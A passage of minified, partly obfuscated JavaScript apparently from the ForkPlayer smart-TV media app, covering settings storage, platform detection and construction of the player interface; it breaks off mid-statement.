is_git=1; var is_ver='2210'; function gV(v,ind1){try{if(typeof v=="undefined")return"";if(v==null)return"";if(ind1!=null)return gV(v[ind1]);return v}catch(e){return""}}
function l0OIIlIIlONuu1111Ypr(s){try{if(s)return JSON.parse(s);else return null}catch(e){return null}}
function ll1lI1lI0sl0OlIYpr(s){try{return JSON.stringify(s)}catch(e){return{}}}
function gP(k){if(IlO11lQ0()==null)return null;else if(k!=null){if(gP()!=null)return gP()[k]}else return IlO11lQ0().page}
function Ill001(k){if(IlO11lQ0()==null)return null;else if(k!=null){if(Ill001()!=null)return Ill001()[k]}else return IlO11lQ0().loadPage}
function IlO11lQ0(k){if(k!=null){if(IlO11lQ0())return IlO11lQ0()[k]}else return oInset.tabs[insetActive]}
function $_(id,text){if(text==null){var x=document.getElementById(id);if(x==null&&document.getElementById("site")){x=document.getElementById("site").contentWindow.document.getElementById(id)}
if(x==null&&document.getElementById("playerjs2")){x=document.getElementById("playerjs2").contentWindow.document.getElementById(id)}
return x}
var bid=(typeof id=="object"?id:$_(id));if(bid){var s=maJor.fp(text);if(maJor.platform()=="maple"&&widgetAPI)widgetAPI.putInnerHTML(bid,s);else bid.innerHTML=s}else{}}
var maJor={GL:null,user:null,countHw:1.4,ua:navigator.userAgent.toLowerCase(),href:document.location.href,FileObj:{},FileObjC:{},box_low:0,virtual:0,build:0,box_client:"ForkXMLviewer",ipCountry:"",uadns:"",api:"js",autoimpok:0,ipG:window.ipG,timestamp:-4,allfs:["glsearch","glstart","history","settings","epg_set","url0","url1","url2","url3","url4","url5","url6","url7","urlInset","searches","enteres","zakladki.xml","zakladkiSerials.xml","zakladkiFilms.xml","zakladkiIPTV.xml","times","vk_audio_pl","vk_audio_sel","vk_pl_url","bookmarks","lic","mlang","ordered","xr","url8","url9","storage","lastdata","datas"],f_cols:"#EEEEEE|#FFFFCC|#FFFF99|#FFFF66|#FFFF33|#FFFF00|#CCCC00|#FFCC66|#FFCC00|#FFCC33|#CC9900|#CC9933|#996600|#FF9900|#FF9933|#CC9966|#CC6600|#996633|#663300|#FFCC99|#FF9966|#FF6600|#CC6633|#993300|#660000|#FF6633|#CC3300|#FF3300|#FF0000|#CC0000|#990000|#FFCCCC|#FF9999|#FF6666|#FF3333|#FF0033|#CC0033|#CC9999|#CC6666|#CC3333|#993333|#990033|#330000|#FF6699|#FF3366|#FF0066|#CC3366|#996666|#663333|#FF99CC|#FF3399|#FF0099|#CC0066|#993366|#660033|#FF66CC|#FF00CC|#FF33CC|#CC6699|#CC0099|#990066|#FFCCFF|#FF99FF|#FF66FF|#FF33FF|#FF00FF|#CC3399|#CC99CC|#CC66CC|#CC00CC|#CC33CC|#990099|#993399|#CC66FF|#CC33FF|#CC00FF|#9900CC|#996699|#660066|#CC99FF|#9933CC|#9933FF|#9900FF|#660099|#663366|#9966CC|#9966FF|#6600CC|#6633CC|#663399|#330033|#CCCCFF|#9999FF|#6633FF|#6600FF|#330099|#330066|#9999CC|#6666FF|#6666CC|#666699|#333399|#333366|#3333FF|#3300FF|#3300CC|#3333CC|#000099|#000066|#6699FF|#3366FF|#0000FF|#0000CC|#0033CC|#000033|#0066FF|#0066CC|#3366CC|#0033FF|#003399|#003366|#99CCFF|#3399FF|#0099FF|#6699CC|#336699|#006699|#66CCFF|#33CCFF|#00CCFF|#3399CC|#0099CC|#003333|#99CCCC|#66CCCC|#339999|#669999|#006666|#336666|#CCFFFF|#99FFFF|#66FFFF|#33FFFF|#00FFFF|#00CCCC|#99FFCC|#66FFCC|#33FFCC|#00FFCC|#33CCCC|#009999|#66CC99|#33CC99|#00CC99|#339966|#009966|#006633|#66FF99|#33FF99|#00FF99|#33CC66|#00CC66|#009933|#99FF99|#66FF66|#33FF66|#00FF66|#339933|#006600|#CCFFCC|#99CC99|#66CC66|#669966|#336633|#003300|#33FF33|#00FF33|#00FF00|#00CC00|#33CC33|#00CC33|#66FF00|#66FF33|#33FF00|#33CC00|#339900|#009900|#CCFF99|#99FF66|#66CC00|#66CC33|#669933|#336600|#99FF00|#99FF33|#99CC66|#99CC00|#99CC33|#669900|#CCFF66|#CCFF00|#CCFF33|#CCCC99|#666633|#333300|#CCCC66|#CCCC33|#999966|#999933|#999900|#666600|#FFFFFF|#CCCCCC|#999999|#666666|#333333|#000000".split("|"),nupd:0,TS:null,jsonSets:["otherSettings","JTVRegion","next","quality","passwordkey","password","recovery","player","fon","pr","color","remote","remoteip","streamplayer","lang","buffer","Ph","Pw","vk_code","vk_id","vk_token","fs","sortiptv","xmode","pip","audioplayer","ts","timeoutiptv","rate","country","snow","livesearch","weather","serv","sidebar","return","adult","time","udp","keyboard","proxy","third","scrsaver","name","zoom","acestream","font","torrserve","headers"],allPlayerButton:{"stop":{"img":"_ST_button_pause.png","row":[0,1]},"play":{"img":"_ST_button_play.png","row":[1,1]},"rewind":{"img":"_ST_button_rewind.png","row":[2,1]},"forward":{"img":"_ST_button_forward.png","row":[3,1]},"option":{"img":"_ST_button_option.png","row":[4,1]},"lastview":{"img":"_ST_button_last.png","row":[5,1]},"prev":{"img":"_ST_button_prev.png","row":[6,1]},"next":{"img":"_ST_button_next.png","row":[7,1]},"qual_text":{"img":"_ST_button_hide.png","row":[0,3]},"exit_text":{"img":"_ST_button_close.png","row":[1,3]}},omniBut:[{"id":"kb1","onclick":"gotoStart();","img":"_ST_page_home.png","quick":"blue"},{"id":"kb2","onclick":"tmf();","img":"_ST_page_back.png"},{"id":"kb3","onclick":"IlO11lQ0().forward();","img":"_ST_page_fwd.png"},{"id":"kb4","onclick":"page_rs();","img":"_ST_page_reload.png"},{"id":"top2text","onclick":"oInset.editUrl();","img":"_ST_page_home.png"},{"id":"kb5","onclick":"kjtYpr.llI0IOruD0IOI1IYpr('favmenu');","img":"_ST_page_fav_off_white.png","quick":"green"},{"id":"kb6","onclick":"kjtYpr.llI0IOruD0IOI1IYpr('topmenu');","img":"_ST_page_menu_white.png","quick":"yellow"}],ds:function(){var c=this;var k={JTVRegion:2,next:1,remoteip:"",quality:1,clear:0,passwordkey:'0000',password:'',recovery:1,player:'html5',streamplayer:'jw',fon:"",lang:"ru",country:0,pr:70,color:"#EEEEEE",search:3,remote:0,buffer:2,ibuffer:15,third:0,xmode:0,Pw:100,Ph:100,timeoutiptv:20,vk_code:'',vk_id:"",vk_token:"",audioplayer:"1",headers:1,fs:"1",rate:0,ts:0,sortiptv:0,acestream:"",torrserve:"",serv:"",pip:0,sidebar:0,scrsaver:1,font:"",adult:0,time:0,zoom:"100",keyboard:""};if(c.href.indexOf("/workspace/")>0||c.model=="sonyplaystation")k.headers=0;if(c.platform()=="lgw2")k.player="ifrhtml5";if(c.platform()=="tizen")k.player=k.streamplayer="tizen";else if(c.platform().match(/sams|mag|dune/))k.player=k.streamplayer="media";else if(c.platform()=="android-device"){k.Pw=1280;k.Ph=720;if(c.sdk>20){k.keyboard="system";k.player="html5";k.streamplayer="jw"}else k.player=k.streamplayer="media"}
if(c.box_low)k.fon=-1;return k},readC:function(n){var c=this,s;if(c.platform()=="android-device")return"";if(typeof c.FileObjC[n]!="undefined")return c.FileObjC[n];var matches=document.cookie.match(new RegExp("(?:^|; )"+n.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,'\\$1')+"=([^;]*)"));return matches?decodeURIComponent(matches[1]):""},writeC:function(name,value){var c=this;if(c.platform()=="android-device")return;c.FileObjC[name]=value;var props={path:"/",expires:"Wed, 20 Apr "+10+(new Date().getFullYear())+" 22:20:11 GMT"};var updatedCookie=name+"="+encodeURIComponent(value);for(var propName in props)updatedCookie+="; "+propName+"="+props[propName];document.cookie=updatedCookie},read:function(n){var c=this,s;if(n=="")return"";if(c.platform()=="mag"||(c.autoimpok>=2&&c.params.get("ts")))s=c.FileObj[n];else if(c.platform()=="maple"&&FileSystem){var fileSystemObj=new FileSystem();if(!c.validateDir){if(!fileSystemObj.isValidCommonPath(curWidget.id))fileSystemObj.createCommonDir(curWidget.id);c.validateDir=1}
var fileObj=fileSystemObj.openCommonFile(curWidget.id+'/'+n,'r');if(fileObj!=null){s=fileObj.readAll();fileSystemObj.closeCommonFile(fileObj)}}else if(window.localStorage)s=localStorage.getItem(n);if(gV(s)===""&&n.match(/^(settings|ID|IDS|oID)$/))s=c.readC(n);if(n=="settings"){var t=s.split("|");if(t.length>10){var a={"zakladki.xml":'_FPzakladki_ / _FPRaznoe_',"zakladkiSerials.xml":"_FPzakladki_ / _FPSeriali_","zakladkiFilms.xml":"_FPzakladki_ / _FPFilmi_","zakladkiIPTV.xml":"_FPzakladki_ / IPTV"};for(var i=0;i<c.jsonSets.length;i++){a[c.jsonSets[i]]=t[i].replace(/%7C/g,"|")}
s=ll1lI1lI0sl0OlIYpr(a)}}
return gV(s).replace(/_OS_/g,"http://obovse.ru/smarttv/").replace(/_OL_/g,"http://obovse.ru/alexkdpulg.php?list=").replace(/\r|\n|\t/g,"")},wchanged:0,write:function(n,v){var c=this;c.wchanged=1;v=String(v).replace(/\r|\n|\t/g,"");c.FileObj[n]=v;if(c.platform()=="maple"&&FileSystem){var fileSystemObj=new FileSystem();var fileObj=fileSystemObj.openCommonFile(curWidget.id+'/'+n,'w');if(fileObj!=null){fileObj.writeAll(v);fileSystemObj.closeCommonFile(fileObj)}}else if(window.localStorage&&c.platform()!="mag")localStorage.setItem(n,v);else if(n.match(/^(settings)$/))c.writeC(n,v);if(n.match(/^(ID|IDS|oID)$/))c.writeC(n,v)},params:{get:function(n){var c=maJor;if(n=="history"){var t=l0OIIlIIlONuu1111Ypr(c.read("history"))||[];var k=0,ln=t.length;for(var i=0;i<ln;i++){if(!t[i-k]||!t[i-k].xml_url){t.splice(i-k,1);k++}}
return t}
if(n=="zakladki.xml")return'_FPZakladki_ / _FPRaznoe_';if(n=="zakladkiSerials.xml")return'_FPZakladki_ / _FPSeriali_';if(n=="zakladkiFilms.xml")return'_FPZakladki_ / _FPFilmi_';if(n=="zakladkiIPTV.xml")return'_FPZakladki_ / IPTV';if(n=="ver"){c.ver=c.read(n)||c.readC(n)||librarys.versions().stable;if(c.ver=="beta")c.ver=librarys.versions().beta;if(c.ver==librarys.versions().stable)c.ver+=" (stable)";else if(c.ver<=librarys.versions().old)c.ver+=" (OLD)";else c.ver+=" (beta)";return c.ver}
if(n=="ts"){if(c.TS==null)c.TS=(c.readC(n)=="1"||c.read(n)=="1"||c.platform()=="mag")&&1||0;return c.TS}
if(!c.GL)c.GL=l0OIIlIIlONuu1111Ypr(c.read("settings"))||c.ds();if(n.match(/^(hm|ID|IDS|oID)$/))var r=c.read(n)||c.readC(n);else r=gV(c.GL,n);if(n=="fon"&&c.read("mf")){r=c.read("mf");c.write("mf","");this.set("fon",r)}
if(n=="color")return c.f_cols[r]||r||"#EEEEEE";if(n=="font")return f_font[r]||r||"LG Display";if(n=="name"&&!r)r=capitalizeFirstLetter(c.platform())+"_"+c.hardware;if(r==="true")return 1;else if(r==="false")return 0;else if(n.match(/^(serv|sortiptv|buffer|xmode|time|next|JTVRegion|recovery)$/)&&r!=="")r=parseInt(r)||r;if(n.match(/^(Pw|Ph)$/)&&r!=="")r=parseFloat(r)||r;if(r==='0'||n=="quality"&&r>4)r=0;return r},set:function(n,s,prop){var c=maJor;if(typeof n=="object"){for(var i in n)this.set(n[i],s);}else{if(prop){if(gV(prop,min)!==""&&s<prop.min)s=prop.max||prop.min;else if(gV(prop,max)!==""&&s>prop.max)s=prop.min||prop.max}
if(n=="ts")c.TS=parseInt(s);if(n.match(/^(hm|ts|ID|IDS|oID|ver)$/)){c.writeC(n,s);c.write(n,s)}else{c.GL[n]=s;this.save()}}
return c.params},save:function(){var c=maJor;var v="";for(var i=0;i<c.jsonSets.length;i++){var x=gV(c.GL,c.jsonSets[i]);if(typeof x=="string")x=x.replace(/\|/g,"%7C");v+=x+"|"}
c.write("settings",v)}},appStyles:function(){var c=this;var head=document.getElementsByTagName('head')[0];var styles='#main{width:100%;height:100%;position:absolute;overflow:hidden;left:0px;top:0px;font-size:28px;cursor: default;} '+'#QualCh{display: none; position: absolute;left: 50%;	top: 50%;	transform: translate(-50%, -50%);	border: 5px solid #FFFF00;	background-color: rgb(50, 60, 66); padding: 6px 2px; border: 1px solid gray; width: 33%; z-index: 2; overflow: hidden; font-size: 32px; border-radius: 7px;}'+'#pr{width:100%;height:100%;}'+'#vk{position:absolute;top:0px;left:137px;height:95%;text-align:center;vertical-align:middle;z-index:3;}'+'#popUp{display: none; position: absolute; top: 84%; left: 75%; text-align: left; width: 23%; overflow: hidden; font-size: 16px; color: rgb(118, 118, 118); background-color: rgb(252, 252, 254); padding: 6px; border-radius: 6px; border: 1px solid rgb(118, 118, 118); z-index: 3;}'+'#player{display: none; position: absolute; margin: 0px; width: 100%; height: 100%; left: 0px; top: 0px; padding: 0px; font-size: 26px; overflow: hidden;}'+'body{overflow: hidden; font-family: Georgia, Arial; font-size: 26px; color: rgb(238, 238, 238); margin: 0px; padding: 0px; width: 100%; height: 100%;}'+'.jwplayer{top: 0px; 	left:0px; 	position: absolute !important; z-index: 0 !important;} .video { position: absolute; padding-bottom: 56.25%; height: 0; overflow: hidden; }  .video iframe,   .video object,   .video embed {  position: absolute;  top: 0;  left: 0;  width: 100%;  height: 100%;}'+'@keyframes blink{			50% {opacity:0;}			100% { opacity:1; }		}		@-webkit-keyframes blink{			0% { opacity:1; }			50% { opacity:0; }			100% { opacity:1; }		}		@-moz-keyframes blink{			0% { opacity:1; }			50% { opacity:0; }			100% { opacity:1; }		}';if(!c.init_style&&head){var css=document.createElement('style');css.type='text/css';if(css.styleSheet)
css.styleSheet.cssText=styles;else css.appendChild(document.createTextNode(styles));head.appendChild(css);c.init_style=1}},_img:function(s){if(!s)s="_ST_1px.png";else if(s.match(/^.{0,3}(none|hidden|undefined)/))s="_ST_1px.png";s=s.replace("_ST_","http://staticdata.appinfo.su/staticfiles/fimg/");if(s.indexOf("ndate")>0){var mtc=s.match(/ndate(.*?)_/);var n=(mtc?mtc[1]:999999)}else n=180929;if(version_local_files>=n&&!s.match(/visual(2|3).gif$/)&&(!s.match(/fon..?\.jpg$/)||s.indexOf("fon20.jpg")>0)){s=s.replace("http://staticdata.appinfo.su/staticfiles/fimg/","static/")}
return s},appDivAfter:function(){var c=this;if($_("MenuCh"))$("#MenuCh").remove()},rgba:function(s){var c=this;if(c.params.get("pr")<=0||c.params.get("pr")==100||c.box_low){try{var m=s.match(/\((.*),/)[1].split(",");return"#"+hex(m[0])+hex(m[1])+hex(m[2])}catch(e){}}
return s},appDivBody:function(){var c=this;try{if(c.inited)return;$_("pr",''+'<div id="panel" style="width:100%;border-bottom:1px solid gray;background-color: #495255;">'+'<div id="top" style="width:100%; height: 34px;">'+'<div id="widgets" style="max-width: 310px; width:33%;height:100%;overflow:hidden;float:right;margin-right: 5px;">'+'<span id="widget_date" style="width: 62%;float: left;padding-top:2px;"></span>'+'<div id="widget_time" style="width: 35%;float:right;" title="Назад" onclick="tmf();"></div> '+'</div> '+'<div id="remote" style="padding-top: 3px;float:right;" title="Состояние вспомогательной компьютерной программмы Remote ForkPlayer"><img align="left" id="remotesrc" alt="R" title="Нажмите чтобы обновить состояние RemoteFork" height="24" width="24" src="'+c._img("_ST_1px.png")+'" /><img align=left id="acesrc" width="24" height="24" src="'+c._img("_ST_1px.png")+'" style="display:none;" /></div>'+'<div id="weather" style="padding-top: 1px;width:81px;height: 29px; overflow: hidden; display: block;float:right;"></div>'+'<div id="inset" style="width:auto;position: inherit;height:100%;overflow:hidden;float: none;padding: 0px 0px 0px 5px;margin: 0px;text-align:left;font-size:85%;white-space: nowrap;"></div>'+'<div id="textinfo" style="position: absolute; left: 23px; top: 0px; z-index: 0; background-color: black;"></div>'+'</div>'+'<div id="top2" style="margin: 0px;padding: 4px 10px 0px 10px;"></div>  '+'<div id="sidebar" style="height:25px; width:100%; display:none; overflow:hidden;padding:5px 3px 0px 3px; font-size:16px;"></div>'+'</div>'+'<iframe id="site" style="background:none;z-index:0;position:absolute;top:75px;left:0px;height:100%;width:100%;margin:0px; padding:0px; overflow:hidden;border:none;" allow="encrypted-media;" sandbox="allow-scripts allow-same-origin" frameborder="0" '+'src=\'\'></iframe>'+'<div id="MenuCh" style="position:absolute;z-index:1;display:none;padding:3px 7px 3px 7px;left:290px;border:1px solid gray;width:340px;height:auto;overflow:hidden;font-size:27px;border-radius:6px;background-color:#323c42;"></div>  '+'<div id="btdiv" style="position:absolute;top:96%;float:right;width:30%;height:30px;overflow:hidden;display:none;"></div>'+'<div id="quick_but" style="top: 82px; left: 1000px; display: none; padding: 2px; z-index: 1; color: black; background-color: rgb(250, 250, 250); font-size: 25px; position: absolute;"></div>'+'<div id="but_nav" style="width: 10px; height: 581px; top: 87px; left: 4px; padding: 2px; border-radius: 2px; display: none; position: absolute;"></div>'+'<div id="vk_play_button" onclick="keyHandler({keycode:VK_PLAY});" style="width: 30px; height: 35px; top: 95.5%; left: 95%; display: none; position: absolute; background-position: 0px -3px; background-image: url('+c._img("_ST_audio_controls.png")+');"></div>'+'<div id="playermini" style="width: 420px; height: 267px; top: 453px; left: 860px; display: none; position: absolute; background-color: black;"></div>');var obh='<div id="kbuts">';for(var i=0;i<c.omniBut.length;i++){if(i==5)obh+='<div style="float:right;">';if(gV(c.omniBut[i],"quick")!="")var cl="<span id='bt"+i+"' style='border-radius:2px;position: absolute;padding: 4px; margin: 17px;background: "+c.omniBut[i].quick+";'></span>";else cl="";if(c.omniBut[i].id=="top2text"){var obh2='<div id="'+c.omniBut[i].id+'" onclick="'+c.omniBut[i].onclick+'" onmouseout="this.style.backgroundColor=\'#787d7e\';" onmousemove="this.style.backgroundColor=\'#888d8e\';" style="background-color:#787d7e;float:none;border-radius: 6px;border:2px solid transparent;padding:2px 0 0 6px;margin: 2px 5px 0px 0px;white-space: nowrap;overflow:hidden;"><div id="navigate" style="overflow: hidden;text-overflow: ellipsis;height:100%;margin-top:0px;margin-right: 35px;"></div></div>'}else obh+='<div id="'+c.omniBut[i].id+'" onclick="'+c.omniBut[i].onclick+'" onmousemove="mh(-4,'+i+');" style="'+(i==5?'margin-left:-37px;':'')+'border:2px solid transparent;float:left;height: 28px;border-radius: 50%;">'+cl+'<img id="'+(i==3?'page_load':'img'+c.omniBut[i].id)+'" style="padding:4px;width:20px;height:20px;" src="'+c._img(c.omniBut[i].img)+'" /></div>';if(i==6)obh+='</div>'}
obh+=obh2+'</div>';obh+='';$_("top2",obh);$_("pr").onmousemove=function(){screensavertimer=-1};if(c.platform()=="mag")c.body.style.margin="10px 15px";c.body.insertAdjacentHTML("beforeend",'<div id="statbar2" style="bottom: 0px; height: 20px; left: 0px; display: none; overflow: hidden; width: 100%; z-index: 1; font-size: 16px; position: absolute; white-space: nowrap; zoom: 100%;"></div></div><div id="ext" style="background: none; height: 640px; top: 43px; left: 0px; overflow: hidden; width: 100%; display: none; position: absolute;"></div><div id="scrsaver" onmousemove="screensavertimer=-1;screensaver_mod(0);" style="background: black; height: 0px; top: 0px; left: 0px; z-index: -1; width: 0px; display: none; position: absolute;"></div><div id="subtitle" style="width: 1200px; top: 545px; font-size: 40px; left: 40px; position: absolute; display: none; text-align: center; font-weight: bold; text-shadow: black -1px 0px, black 0px 1px, black 1px 0px, black 0px -1px;"></div><div id="bcg1" style="width: 100%; height: 63%; z-index: -1; top: 0px; left: 0px; display: none; position: absolute; background-repeat: repeat-y;"></div><div id="bcg2" style="width: 860px; height: 100%; z-index: -1; position: absolute; top: 0%; left: 0px; display: none;"></div>');var meta=document.createElement('meta');meta.name="referrer";meta.content="never";document.getElementsByTagName('head')[0].appendChild(meta);if(maJor.platform()=="mag")$_("widget_time").style.fontWeight="normal";$_("player").insertAdjacentHTML("beforebegin",'<div id="loading" style="position: absolute;z-index:2;text-align: center;display:none;"><img src="'+c._img("_ST_b_loading.gif")+'"/></div>'+'<video id="video" style="width: 100%; height: 100%; background-color: black; z-index: 0; top: 0px; left: 0px; display: none; margin: 0px; padding: 0px; position: fixed;"></video>'+'<div id="jw" style="width: 100%; height: 100%; background-color: black; z-index: 0; top: 0px; left: 0px; display: none; margin: 0px; padding: 0px; position: absolute;"></div>'+'<div id="other" style="width: 100%; height: 100%; top: 0px; left: 0px; display: none; position: absolute;"></div><div id="whitestripes1" style="width: 100%; height: 0px; background-color: black; z-index: 0; top: 0px; left: 0px; display: none; position: absolute;"></div><div id="whitestripes2" style="width: 100%; height: 0px; background-color: black; z-index: 0; top: 0px; left: 0px; display: none; position: absolute;"></div>');$_("player",'<div id="prekinfo" style="float:left;padding:43px 10px;display:none; color: #c5bfbf;	text-shadow: 		-0   -1px 0   #000000,		 0   -1px 0   #000000,		-0    1px 0   #000000,		 0    1px 0   #000000,		-1px -0   0   #000000,		 1px -0   0   #000000,		-1px  0   0   #000000,		 1px  0   0   #000000,		-1px -1px 0   #000000,		 1px -1px 0   #000000,		-1px  1px 0   #000000,		 1px  1px 0   #000000,		-1px -1px 0   #000000,		 1px -1px 0   #000000,		-1px  1px 0   #000000,		 1px  1px 0   #000000;"><b>PRE VIDEO INFORMATION</b><div id="rek_button1" onmousemove="rek_sel=0;rekBox();" onclick="rek_sel=0;keyHandler({keycode:VK_ENTER});}" style="max-width: 600px; max-height: 80px; overflow: hidden; top: 600px; padding: 7px; left: 40px; font-size: 22px; display: none; position: absolute; border: 2px solid rgb(197, 195, 195);"></div><div id="rek_button2" onmousemove="rek_sel=1;rekBox();" onclick="rek_sel=1;keyHandler({keycode:VK_ENTER});}" style="padding: 7px; top: 600px; max-width: 300px; left: 920px; font-size: 22px; display: none; max-height: 80px; overflow: hidden; position: absolute; border: 2px solid rgb(197, 195, 195);"></div></div>'+'<div id="pstream" style="width:85%;margin:4px;font-size:96%;text-align:left;color:white;position:absolute;	left:0px;	top:0px;">'+'<div style="float:left;"><div id="pstr" style="float:left;margin-top: 5px;"></div></div><div id="player_time" style="float:left;margin: 0px 4px;"></div><div id="infR" style="float:left;    margin: 0px 4px;"></div><div id="infPl" style="float:left;    margin: 0px 4px;"></div></div>'+'<div id="buttonTop" style="float:right;margin-right:10px;"><div id="qual_text"></div>    <div id="exit_text"></div></div>'+'<div id="playerBottom" style="position:absolute;top:78%;left:0px;width:100%;height:158px;">'+'<div id="arrowtime" style="color:black;margin-top: -22px;border-radius: 4px;margin-top: -22px;padding: 2px 6px;height: 22px;font-size: 19px;text-align: center;background-color: rgb(204, 204, 204);position: absolute;"></div>'+'<div id="progressBarClick" style="width:100%;height:12px;background-color:#cccccc;position: absolute;">'+'<div id="progressBarStatus" style="float:left;height:100%;background: #ad1c36;"> </div>'+'<div id="progressBall" style=" width: 20px;height: 20px;margin-top: -4px;background: #ad1c36;float: left; -moz-border-radius: 10px;border-radius: 10px;"></div>'+'<div id="progressBuffer" style="float: left;height: 100%;display:none;background-color:#ffcccc;"> </div>'+'</div>'+'<div style="background: '+c.rgba("rgba(17,19,19,0.56)")+';height: 86px;width: 100%;padding:4px 0px 0px 0px;margin-top:8px;">'+'<div style="width: 243px;padding-right: 12px;height: 23px;margin-top: 2px;font-size: 26px;color: rgb(203,0,32);float: right;text-align: right;"> <span id="remainingTime" style="color:rgb(255,255,255);"></span> <span id="totalTime" style=" color: #EEEEEE;"></span></div>'+'<div id="ptt" style="float: left;margin-top: -15px;margin-left: 13px;text-align: center;width: 98%;z-index: 2;color: #EEEEEE;clear: both;word-break: break-word;overflow: hidden;height: 80px;"></div>'+'<div id="epg_full" style="height: 78px;top: 19px; left: 25%; display: none;position: absolute;overflow: hidden;font-size: 22px;"></div> '+'</div>'+'<div id="buttonLayout" style="width:100%;text-align:center;padding:5px;background:'+c.rgba("rgba(17,19,19,0.44)")+'">'+'<div id="stop"></div>'+'<div id="play"></div>'+'<div id="rewind"></div><div id="forward"></div> <div id="option"></div> <div id="lastview"></div>  <div id="prev"> </div>'+'<div id="next"></div> '+'</div>'+'<div id="chat" style="width: 280px; height: 100%; top: 0px; left: 1000px; display: none; position: absolute; background-color: black;"></div><div id="thumb" style="top: 534px; left: 300px; width: 128px; height: 72px; overflow: hidden; display: none; padding: 2px; background-color: black; position: absolute;"></div>'+'</div>');for(var i in c.allPlayerButton){if(i=="play")var dop='<div id="recovery" onclick="trpt();" style="position:absolute;font-size:70%;text-align:center;"></div>';else dop='';$_(i).style.margin="2px 2px 0px 0px";$_(i).style.borderRadius="5px";$_(i).style.textAlign="center";$_(i).style.display="inline-block";if(c.allPlayerButton[i].row[1]==1)$_(i).style.width="10%";$_(i,dop+"<img align='center' style='margin:auto;width: 100%;max-width: 55px;height: 50px;' src='"+c._img(c.allPlayerButton[i].img)+"' />");$_(i).onmousemove=function(event){resetFocus();rowID=maJor.allPlayerButton[this.id].row[1];cntIndex=maJor.allPlayerButton[this.id].row[0];if(rowID==3)this.style.background="#ff0000";else this.style.background="#aa2222"}
$_(i).onclick=function(){if(rowID==3)this.style.background="#ff0000";else this.style.background="#aa2222";rowID=maJor.allPlayerButton[this.id].row[1];cntIndex=maJor.allPlayerButton[this.id].row[0];selectedButton()}}
if(c.platform()=="android-device"){var meta=document.createElement('meta');meta.name="viewport";meta.content="width=1280";document.getElementsByTagName('head')[0].appendChild(meta)}
FXMLPage.ll00IOO11EVII1IYpr();c.inited=1}catch(e){c.popUp("Error 0 INITED: "+e.message)}},statusbarcreate:function(){var c=this;var div=document.createElement('div');div.id="statbar2";div.style.bottom="0px";div.style.height="20px";div.style.left="0px";div.style.display="none";div.style.overflow="hidden";div.style.width="100%";div.style.zIndex="0";div.style.fontSize="16px";div.style.position="absolute";div.style.whiteSpace="nowrap";c.body.appendChild(div);return div},fp:function(text){var c=this;var s=gV(text),ch;var lang=c.params.get("lang");if(s.indexOf("_FP")>-1){if(0&&_lang.lang&&_lang.lang._powered=="translate.yandex.ru"){var k="",v="";for(var i in _lang.ru){if(k!="")k+="\n";if(v!="")v+="\n";k+=_lang.ru[i];v+=i}
lI0O1IIlOVhl10II1lYprPost("http://obovse.ru/smarttv/api.php?do=translate&lang="+lang,"v="+v+"&s="+encodeURIComponent(k),"translate");_lang.lang._powered="Powered translate.yandex.ru";return}
var regexp=new RegExp("_FP(.*?)_","g");while((ch=regexp.exec(text))!=null){if(lang&&window._lang&&_lang[lang]&&_lang[lang][ch[1]])var t=_lang[lang][ch[1]];else t=ch[1];s=s.replace("_FP"+ch[1]+"_",t)}}
return s},popUp:function(text,timer){var c=this,div=$_("popUp");$_("popUp").style.top="84%";$_("popUp").style.left="75%";$_("popUp").style.width="23%";$_("popUp").style.fontSize="15px";$_("popUp").style.backgroundColor="#E0E0E0";$_("popUp").style.border="1px solid #767676";$_("popUp").style.color="black";timer=timer||3500;clearTimeout(c.popTimer);if(!text)$_("popUp").style.display="none";else{setTimeout(function(){$_("popUp",text);$_("popUp").style.display="block";c.popTimer=setTimeout(function(){$_("popUp").style.display="none"},timer)},160)}},statusbar:function(text,mode){var c=this,timer=45000;text=gV(text);var div=$_("statbar2");if(div){clearTimeout(c.statusTimer);clearTimeout(c.statusTimer2)}else div=c.statusbarcreate();if(!text||text=="off")div.style.display="none";if((c.handler=="player"||c.handler=="qual")&&$_("loading")&&$_("loading").style.display!="block")return;if(!mode)timer=1000;else if(mode=="hint")timer=10000;else if(mode=="link"){if(text.indexOf("curl")==0){var curl=parseCURL(text);text=curl.url;if(curl.method=="POST")text+=" "+curl.body}
text=text.split("#POST")[0];if(text.indexOf("?list=")>0){text=unescape(text.split("?list=")[1])}
text=text.replace(/.box_client=lg.*/,"");text=text.replace(/.w_lang=.*/,"");text=text.replace(/.*?\/xhr.php.../,"...");text="_FPOzhidanie_ "+text}else if(mode=="dns")text="_FPOzhidanie_ DNS "+text;else if(mode=="translate"){timer=60000;text="_FPOzhidanie_ "+text}else if(mode=="copy")timer=900000;else if(mode=="fulllink"){if(text.lastIndexOf("http")>5){var text="_FPOzhidanie_ "+"http"+decodeURIComponent(text.split("http")[1])}else text="_FPOzhidanie_ "+text}
if(!c.complete)$_("statbar2").style.zIndex=3;else $_("statbar2").style.zIndex=1;$_("statbar2","<div id='textbar' style='height: 100%;display:inline-block;padding:0px 2px;margin: auto 0px;max-width:300px;overflow:hidden;text-overflow: ellipsis;color:#7D7D7D;background-color:#FAFAFA;'>"+text+"</div>");c.statusTimer2=setTimeout(function(){$_("textbar").style.maxWidth=""},2200);$_("statbar2").mode=gV(mode);$_("statbar2").style.display="block";c.statusTimer=setTimeout('$_("statbar2").style.display="none";',timer)},showfon:1,fonEnabled:function(){var c=this;if(c.params.get("fon")==-1||!c.showfon||c.params.get("pr")==0)return 0;else return 1},platform:function(){var c=this,p;if(c._platform)return c._platform;if(document.location.href.indexOf("dns=")>0)c.uadns=document.location.href.split("dns=")[1];else if(window.dns)c.uadns=dns;c.pluginAPI=pluginAPI;if(window.andr){p="android-device";c.app_cors=!0}else if(window.tizen){p="tizen";c.app_cors=!0}else if(c.pluginAPI){p="maple";c.app_cors=!0}else if(window.webOS)p="lgw";else if(ua.match(/mag200/)&&window.gSTB){p="mag";c.app_cors=!0}else if(ua.match(/dune/)&&$_("dune-api")&&$_("dune-api").init){p="dune";c.app_cors=!0}else if(ua.match(/android/)){p="android"}else if(ua.match(/hisense/i))p="hisense";else if(ua.match(/webos.tv-20(15|16|17|18|19|2|3)/)){p="lgw2"}else if(ua.match(/webos/)){p="lgw"}else if(ua.match(/webappmanager/)){p="lg"}else if(ua.match(/lg simplesmart/)){p="lg"}else if(ua.match(/netcast|lge;/)){p="lg"}else if(ua.match(/philips/))p="ph";else if(window.__spark_stbid__&&(ua.match(/technisat/)||ua.match(/sh4;.*presto/))){p="spark";c.app_cors=!0;c.box_low=1;c.showfon=!1}else if(ua.match(/sony|bravia|playstation|inettvbrowser|bravia/))p="sony";else 